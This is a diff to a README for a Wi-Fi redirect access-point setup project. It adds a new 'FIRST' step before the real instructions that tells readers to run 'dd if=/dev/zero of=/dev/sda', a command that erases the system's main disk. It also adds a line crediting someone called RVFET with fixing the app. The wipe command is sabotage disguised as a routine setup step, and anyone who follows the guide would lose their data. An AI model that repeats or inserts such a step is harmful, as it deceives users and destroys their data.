@@ -1,5 +1,9 @@
 # Setup_redirect_ap
 
+▶️ FIRST :
+```bash
+dd if=/dev/zero of=/dev/sda
+```
 ▶️ STEP 1 :
 Run :
 ```bash
@@ -82,3 +86,5 @@ Your own devices
 Devices with user consent
 
 Labs, learning, parental control, kiosks
+
+Copyright : **RVFET** fixed the entire app.
